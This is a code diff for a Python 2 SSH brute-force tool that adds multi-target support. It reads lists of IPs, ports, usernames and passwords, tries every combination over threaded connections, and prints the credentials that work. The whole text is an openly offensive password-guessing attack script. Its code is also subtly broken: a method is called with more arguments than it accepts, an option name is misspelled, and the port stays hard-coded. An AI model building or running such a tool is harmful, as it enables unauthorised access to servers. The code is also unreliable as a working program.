@@ -17,7 +17,9 @@ class SSHBruteForce():
     def __init__(self):
         self.info = "Simple SSH Brute Forcer: By Wildicv"
         self.targetIp = ""
-        self.userNames = []
+        self.targetPort = 0
+        self.targets = []
+        self.usernames = []
         self.passwords = []
         self.connections  = []
         self.amountOfThreads = 0
@@ -30,45 +32,93 @@ class SSHBruteForce():
         
         optionParser = OptionParser(version = self.info, usage = usage)
 
-        optionParser.add_option('-i',  dest = 'targetIp',        help = 'Host To Attack')
-        optionParser.add_option('-U',  dest = 'userList',        help = 'Username List file')
-        optionParser.add_option('-P',  dest = 'passwordList',    help = 'Password List file')
-        optionParser.add_option('-t',  type = 'int', dest = 'threads', default = 10,  help = 'Amount of Threads')
-        optionParser.add_option('-T',  type = 'int', dest = 'timeout', default = 15,  help = 'Timeout Time')
-        optionParser.add_option('-v',  '--verbose', action='store_true', dest='verbose', help='verbose')
+        optionParser.add_option('-i',  dest = 'targetIp',              
+                                help = 'Ip to attack')  
+        optionParser.add_option('-p',  dest = 'targetPort',            
+                                help = 'Ip port to attack', default = 22)
+        optionParser.add_option('-I',  dest = 'targetsFile',
+                                help = 'List of IP\'s and ports')       
+        optionParser.add_option('-U',  dest = 'usernamesFile',              
+                                help = 'Username List file')  
+        optionParser.add_option('-P',  dest = 'passwordsFile',          
+                                help = 'Password List file')
+        optionParser.add_option('-t',  type = 'int', dest = 'threads', 
+                                help = 'Amount of Threads', default = 10)
+        optionParser.add_option('-T',  type = 'int', dest = 'timeout', 
+                                help = 'Timeout Time', default = 15)
+        optionParser.add_option('-v',  '--verbose', action='store_true', 
+                                dest='verbose', help='verbose')
 
         (options, args) = optionParser.parse_args()
 
-        if not options.targetIp or not options.userList or not options.passwordlist:
+        #First a check is used to see if there is at least a singleIp set or a targetList set
+        if not options.targetIp and not options.targetsFile:            
             optionParser.print_help()
             sys.exit(1)
+            
+        else:
+            #Then another check to make sure the Username list and passwordlist are filled
+            if options.usernamesFile and options.passwordsFile:
+                #Then we check if it is a single ip only
+                if options.targetIp and not options.targetsFile:
+                    self.singleTarget(options)
         
-        self.targetIp = options.targetIp
-        self.userNames = Util.fileContentsToList(options.userList)
-        self.passwords = Util.fileContentsToList(options.passwordlist)
-        self.amountOfThreads = options.threads
-        self.timeoutTime = options.timeout
-        self.verbose = options.verbose
-        
-        self.showStartInfo()
-        self.bruteForceSingle()
+                elif not options.targetIp and options.targetsFilet:
+                    self.multipleTargets(options)
+                else:
+                    optionParser.print_help()
+                    sys.exit(1)
+            else:
+                optionParser.print_help()
+                sys.exit(1)
+            
+    def singleTarget(self,options):
+            self.targetIp  = options.targetIp
+            self.targetPort = options.targetPort
+            self.usernames = Util.fileContentsToList(options.usernamesFile)
+            self.passwords = Util.fileContentsToList(options.passwordsFile)
+            self.amountOfThreads = options.threads
+            self.timeoutTime = options.timeout
+            self.verbose = options.verbose
+            self.showStartInfo()
+            self.bruteForceSingle()
+            
+    def multipleTargets(self,options):    
+            self.targets = Util.fileContentsToTuple(options.targetsFile)
+            self.usernames = Util.fileContentsToList(options.usernamesFile)
+            self.passwords = Util.fileContentsToList(options.passwordsFile)
+            self.amountOfThreads = options.threads
+            self.timeoutTime = options.timeout
+            self.verbose = options.verbose
+            self.showStartInfo()
+            self.bruteForceMultiple()
         
     def showStartInfo(self):
         print "[*] %s " % self.info
         print "[*] Brute Forcing %s"     % self.targetIp
-        print "[*] Loaded %s Usernames"  % str(len(self.userNameList))
-        print "[*] Loaded %s Passwords"  % str(len(self.passwordList))
+        print "[*] Loaded %s Usernames"  % str(len(self.usernames))
+        print "[*] Loaded %s Passwords"  % str(len(self.passwords))
         print "[*] Brute Force Starting"
 
     def bruteForceSingle(self):
-        for userName in self.userNames:
+        for username in self.usernames:
             for password in self.passwords:
-                self.createConnection(userName, password, self.targetIp)
-            if self.currentThreadCount == self.amountOfThreads:
-                self.currentThreadResults()
-            
-    def createConnection(self, userName, password, targetIp):
-        connection = Connection(userName, password, targetIp, 22, self.timeoutTime)
+                self.createConnection(username, password, self.targetIp, 
+                                      self.targetPort, self.timeoutTime)
+                if self.currentThreadCount == self.amountOfThreads:
+                    self.currentThreadResults()
+                    
+    def bruteForceMultiple(self):
+        for target in self.targets:
+            for username in self.usernames:
+                for password in self.passwords:
+                    self.createConnection(username, password, target[0], 
+                                          int(target[1]), self.timeoutTime)
+                    if self.currentThreadCount == self.amountOfThreads:
+                        self.currentThreadResults()
+        
+    def createConnection(self, username, password, targetIp):
+        connection = Connection(username, password, targetIp, 22, self.timeoutTime)
         connection.start()
         self.connections.append(connection)
         self.currentThreadCount += 1
@@ -78,7 +128,7 @@ class SSHBruteForce():
             connection.join()
             if connection.status == 'Succeeded':
                 print "[#] TargetIp: %s " % connection.targetIp
-                print "[#] Username: %s " % connection.userName
+                print "[#] Username: %s " % connection.username
                 print "[#] Password: %s " % connection.password
             else:
                 pass
@@ -88,7 +138,7 @@ class SSHBruteForce():
     def clearOldThreads(self):
         self.connections = []
         self.threadCount = 0
-                
+    
     def completed(self):
         print "[*] Completed Brute Force."
         sys.exit(0)
